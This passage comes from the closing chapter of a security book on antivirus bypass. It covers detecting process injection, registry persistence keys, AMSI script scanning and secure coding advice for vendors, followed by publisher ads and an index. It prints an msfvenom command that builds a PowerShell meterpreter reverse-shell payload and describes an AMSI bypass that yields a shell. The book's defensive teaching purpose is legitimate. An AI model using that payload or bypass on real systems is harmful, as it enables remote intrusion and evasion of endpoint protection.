206     Best Practices and Recommendations
For instance, event ID 8 can be used to detect process injection by flagging any incident in 
which a process creates a thread in another process. However, further research needs to be 
conducted in this area to achieve the most holistic detection based on logs.
Registry-based detection
Malware tends to not only inject its code (shellcode, exe, dll, and so on) but also to 
persist in the system. One of the common ways to accomplish this is through the use of 
registry keys. Malware can incubate or persist in the system using the following registry 
keys, for example:
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\
Appinit_Dlls 
HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\
Windows\Appinit_Dlls
These registry keys can be used both as persistent and injection mechanisms. The fact that 
malware can potentially manipulate registry keys by adding a malicious DLL provides it with 
persistency within the system. In addition, it can also be used as an injection mechanism 
because the malicious DLL that is loaded using the previously-mentioned registry keys is in 
fact injected or loaded into any process in the system that loads the standard User32.dll. 
Just imagine the impact and the power of such an injection and persistence ability.
We recommend that antivirus vendors implement in their detection engines the capability 
of detecting malware that executes registry manipulation operations using functions such 
as RegCreateKey and RegSetValue.
Behavior-based detection
As the name suggests, behavior-based detection can be very useful to detect anomalous  
or suspicious activities. Examples of anomalous behavior might include the following:
• A process such as Notepad.exe or Explorer.exe executing strange command-
line arguments or initiating network connections to an external destination
• Processes such as svchost.exe or rundll32.exe running without  
command-line arguments
• Unexpected processes such as PowerShell.exe, cmd.exe, cscript.exe,  
or wmic.exe
Improving antivirus detection     207
File-based detection
Antivirus vendors can implement a minifilter driver in order to achieve file-based detection.
We recommend scanning files before execution, at load time. Scan for suspicious 
indicators and alteration operations before execution begins. For instance, an antivirus 
engine can detect the creation of sections in targeted files.
To summarize, detecting process injection is not an easy task, especially not for antivirus 
vendors. It is crucial to use as many detection capabilities as possible and even correlate 
their results in order to achieve the best possible detection with fewer false positives.
Let's now discuss and understand script-based malware detection with AMSI.
Script-based malware detection with AMSI
In this section, we will go through the use of AMSI in different antivirus software to detect 
script-based malware that utilizes PowerShell, VBA Macros, and more.
AMSI – Antimalware Scan Interface
AMSI is a feature or interface that provides additional antimalware capabilities. Antivirus 
engines can use this interface to scan potentially malicious script files and fileless malware 
scripts that run at the runtime memory level.
AMSI is integrated into various Windows components, such as the following:
• Windows User Account Control (UAC)
• PowerShell
• wscript.exe and cscript.exe
• JavaScript and VBScript
• Office VBA macros
By using Microsoft's AMSI, it is possible to detect potential malicious events such as the 
execution of malicious VBScript, PowerShell, VBA macros, and others.
208     Best Practices and Recommendations
Here is an overview of Microsoft's AMSI internals:
Figure 8.14 – AMSI internals architecture
As seen here, several functions are exposed for use by third-party applications. For 
example, antivirus engines can call functions such as AmsiScanBuffer() and 
AmsiScanString() to scan for malicious content in each file and fileless script-based 
malware before execution takes place. If AMSI detects that the script is malicious using 
these functions, it will halt execution.
AMSI – malware detection example
To better understand AMSI, the following example will demonstrate its capability of 
detecting script-based malware.
Here, we used a simple, non-obfuscated meterpreter shell generated in a PowerShell 
format with the following msfvenom command:
msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.1.10 LPORT=443 --arch x64 --platform win -f psh 
-o msf_payload.ps1
After we executed the script and Windows Defender, AMSI caught our simple PowerShell 
payload. Here is a screenshot of AMSI detecting the msfvenom based malware:
Improving antivirus detection     209
Figure 8.15 – AMSI detects the PowerShell-based MSF payload
As seen here, PowerShell threw an exception alerting us that the file contained  
malicious content.
We can also monitor for these types of events in Windows event logs, using the 
%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-Windows 
Defender%4Operational.evtx event log file, which contains several event IDs 
such as 1116 (MALWAREPROTECTION_STATE_MALWARE_DETECTED) and 1117 
(MALWAREPROTECTION_STATE_MALWARE_ACTION_TAKEN), which are triggered by 
an attempt to execute this type of payload. 
The following screenshot demonstrates the event log entry for our PowerShell payload 
based on event ID 1116:
Figure 8.16 – AMSI detection log based on Event ID 1116
210     Best Practices and Recommendations
And here is the entry based on event ID 1117:
Figure 8.17 – AMSI detection log based on Event ID 1117
Now that we understand the concept and usage of AMSI, let's see how to bypass it.
AMSI bypass example
We often like to say, "To bypass security is to strengthen security." Of course, this also 
applies to AMSI bypassing.
The following example uses the same PowerShell script that we tried to execute in the 
previous example, but with a slight difference. Based on an awesome project called AMSI.
fail (https://github.com/Flangvik/AMSI.fail), we copied the generated 
code from the website, which we can of course also obfuscate to harden the detection, and 
pasted it into the PowerShell console to demonstrate an in-memory-like execution:
Figure 8.18 – The bypass payload used from AMSI.fail
Secure coding recommendations     211
Next, we executed the previous reverse-shell payload and got a full meterpreter shell:
Figure 8.19 – The gained shell after the bypass has been executed
On the left side, you can see the meterpreter shell, and on the right side, you can see the 
msf payload run on PowerShell.
We recommend that antivirus vendors implement this capability, investing extensive 
time and consideration in it if possible. Relying solely on AMSI is obviously not a good 
practice, but as an additional capability in our arsenal, it can add tremendous value to 
antivirus engines.
Malware-based attacks are always evolving and emerging, especially the first stages of 
malware attacks that are delivered and executed through the use of scripts, whether 
through the command line, PowerShell, VBA macros, VBScript, HTA files, or other 
interesting and out-of-the-box methods.
Let's now go through some secure code tips and recommendations.
Secure coding recommendations
Because antivirus software is a product that is by definition providing some level of 
security to endpoints, writing secure code is essential. We can learn from history that 
there are plenty of security vulnerabilities out there that can be used by malicious threat 
actors in the wild, which is why antivirus software vendors must put in their best effort 
to make their antivirus software more secure, plan their code securely, implement best 
practices, and always follow industry guidelines and recommendations.
Here are our secure code development recommendations to help improve your overall 
antivirus software security.
212     Best Practices and Recommendations
Self-protection mechanism
The most basic recommendation for any antivirus software vendor is to ensure that you 
have applied a self-protection mechanism to your own product.
Most antivirus software applies some level of self-protection to make it difficult for 
security researchers or threat actors to exploit vulnerabilities in the antivirus software 
itself. If your antivirus software does not, this recommendation is an absolute must at the 
earliest possible opportunity.
Plan your code securely
To avoid the need for future software updates and patching to your antivirus software to 
the greatest extent possible, it is crucial to plan your antivirus software with an emphasis 
on secure coding, by following best practices and methodological procedures.
This involves mapping all possible vulnerabilities that could be exploited in your product, 
as well as mapping all possible secure code solutions for those vulnerabilities. This ensures 
that your product will not be susceptible to potential future exploits.
It is very important to work methodically, using predefined procedures that can be 
modified if needed.
Do not use old code
With time, antivirus vendors need to advance with their antivirus products, thus 
advancing with their code. It is very important to regularly update the code and also delete 
old code. The odds of exploiting a vulnerability or even chaining several of them because 
of old code implementations are high.
You can always archive the code in some other secure place if you have a good reason  
for this.
Input validation
As we have seen earlier in this section, it is essential to apply input validation at any point 
in your code that expects input from the user or any other third parties such as API calls 
(not necessarily Windows API calls), loaded DLL, network packets received, and more. 
By doing this, we can prevent the possibility of malicious input from users, third parties, 
or even fuzzers, which could lead to denial of service or remote code execution attacks, 
which could ultimately be used to bypass the antivirus software.
Secure coding recommendations     213
PoLP (Principle of Least Privilege)
As we have discussed in previous chapters of this book, antivirus software vendors should 
manage the privileges of each antivirus component so it cannot be misused or exploited 
by the user or any other third-party actor. Be sure to use proper permissions for each 
file (exe, dll, and so on), process, and any other principle or entity that can inherit 
permissions, without providing more permissions than are needed. This can, in turn, 
prevent low-privileged users from excluding a file or process that is actually malicious.
Compiler warnings
This simple yet very effective trick will ensure that the compiler warns you when using 
potentially vulnerable functions such as strcat(), strcpy(), and so on. Be sure 
to configure the highest level of warnings. Simply put, the more time you invest at the 
beginning of the software development life cycle (SDLC), the less time you will need to 
invest in patching your code afterward.
Automated code testing
Implement automation mechanisms to test and validate your code against potentially 
vulnerable functions, imports, and other frameworks. Two approaches to achieving more 
secure and reliable code involve static testing, in which we test our code without executing 
and debugging it, and dynamic testing, which involves executing and debugging the code's 
functionality. We recommend a hybrid approach drawing on aspects of both.
Wait mechanisms – preventing race conditions
To avoid race condition vulnerabilities in your antivirus software, which can lead to 
invalid and unpredictable execution and in some cases, permit feasible antivirus bypass, 
use a "wait mechanism". This will ensure that the program waits for one asynchronous 
operation to end its execution so that the second asynchronous operation can continue.
Integrity validation
When antivirus software downloads its static signature file (to update its static signature 
database), be sure to apply some type of integrity validation mechanism on the 
downloaded file. For instance, you can calculate the designated hash of the downloaded 
file. This mechanism prevents situations where a security researcher or threat actor might 
perform manipulations on the file, swapping the static signature with another file to 
bypass the static antivirus detection engine.
In this section, we learned about ways of protecting our code against potential abuse.
214     Best Practices and Recommendations
Summary
To summarize this chapter of the book, antivirus bypasses will always be relevant for a 
variety of reasons, such as the following:
• Code that is not written securely
• A component that does not work properly.
In this chapter, you have gained knowledge and understanding of the importance of 
securing antivirus software from vulnerability and detection-based bypassed.
In order to protect antivirus engines from bypasses, it is first necessary to perform and 
test bypass attempts, in order to know exactly where the security vulnerability is located. 
Once the security vulnerability is found, a fix must be implemented so attackers cannot 
exploit the vulnerability. Of course, antivirus code must be regularly maintained, because 
from time to time more vulnerabilities can arise and be found.
These recommendations are based on our research and extensive tests conducted over a 
number of years that are also based on major antivirus software vulnerabilities that have 
been publicly disclosed in the last 10 years.
We want to thank you for your time and patience reading this book and gaining the 
knowledge within. We hope that knowledge will be used for the purpose of making the 
world a more secure place to live in.
We are here to say that antivirus is not a 100% bulletproof solution.
Packt.com
Subscribe to our online digital library for full access to over 7,000 books and videos, as 
well as industry leading tools to help you plan your personal development and advance 
your career. For more information, please visit our website.
Why subscribe?
• Spend less time learning and more time coding with practical eBooks and Videos 
from over 4,000 industry professionals
• Improve your learning with Skill Plans built especially for you
• Get a free eBook or video every month
• Fully searchable for easy access to vital information
• Copy and paste, print, and bookmark content
Did you know that Packt offers eBook versions of every book published, with PDF and 
ePub files available? You can upgrade to the eBook version at packt.com and as a print 
book customer, you are entitled to a discount on the eBook copy. Get in touch with us at 
PI:EMAIL for more details.
At www.packt.com, you can also read a collection of free technical articles, sign up for 
a range of free newsletters, and receive exclusive discounts and offers on Packt books and 
eBooks.
216     Other Books You May Enjoy
Other Books You 
May Enjoy
If you enjoyed this book, you may be interested in these other books by Packt:
Mastering Palo Alto Networks
Tom Piens
ISBN: 978-1-78995-637-5
• Perform administrative tasks using the web interface and Command-Line Interface (CLI)
• Explore the core technologies that will help you boost your network security
• Discover best practices and considerations for configuring security policies
• Run and interpret troubleshooting and debugging commands
• Manage firewalls through Panorama to reduce administrative workloads
• Protect your network from malicious traffic via threat prevention
Why subscribe?     217
Okta Administration: Up and Running
Lovisa Stenbäcken Stjernlöf, HenkJan de Vries
ISBN: 978-1-80056-664-4
• Understand different types of users in Okta and how to place them in groups
• Set up SSO and MFA rules to secure your IT environment
• Get to grips with the basics of end-user functionality and customization
• Find out how provisioning and synchronization with applications work
• Explore API management, Access Gateway, and Advanced Server Access
• Become well-versed in the terminology used by IAM professionals
218     Other Books You May Enjoy
Packt is searching for authors like you
If you're interested in becoming an author for Packt, please visit authors.
packtpub.com and apply today. We have worked with thousands of developers and 
tech professionals, just like you, to help them share their insight with the global tech 
community. You can make a general application, apply for a specific hot topic that we are 
recruiting an author for, or submit your own idea.
Leave a review - let other readers know what 
you think
Please share your thoughts on this book with others by leaving a review on the site that 
you bought it from. If you purchased the book from Amazon, please leave us an honest 
review on this book's Amazon page. This is vital so that other potential readers can see 
and use your unbiased opinion to make purchasing decisions, we can understand what 
our customers think about our products, and our authors can see your feedback on the 
title that they have worked with Packt to create. It will only take a few minutes of your 
time, but is valuable to other potential customers, our authors, and Packt. Thank you!
Index
A
Address Space Layout Randomization 
(ASLR)  42, 191
Advanced Persistent Threat (APT)  77
American National Standards 
Institute (ANSI)  67
Android Package Kit (APK) file  98
Antimalware Scan Interface (AMSI)
about  207
bypass example  210, 211
malware detection example  208, 209
script-based malware detection  207
AntiScan.Me
reference link  62
antivirus
basics  8-11
antivirus bypass
binary patching, using  144, 
154, 156, 157
in nutshell  11, 12
junk code, using  159, 160
PowerShell, using  161, 164, 166, 167
preparation  56
research, tips  57
using, dynamic-link library 
(DLL)  81, 83, 84
using, process-injection  63
using, timing-based techniques  85
Windows API calls  86, 88, 89
with encryption  117
with obfuscation techniques  98
with packers  121
antivirus bypass dedicated vulnerabilities
avoiding  189
DLL hijacking vulnerability, 
avoiding  189
Unquoted Service Path vulnerability, 
avoiding  190, 191
antivirus detection, improving
about  192
detection, of process injection  197
dynamic YARA  192
script-based malware detection, 
with AMSI  207
antivirus research
about  16
approaches  40
lead, defining  20
lead, gathering  16
process  17
registry  18, 19
thread  18
220     Index
work environment  16
antivirus software
about  7, 180
bypassing, in red team operation  179
fingerprinting  180-185
third-party engines  36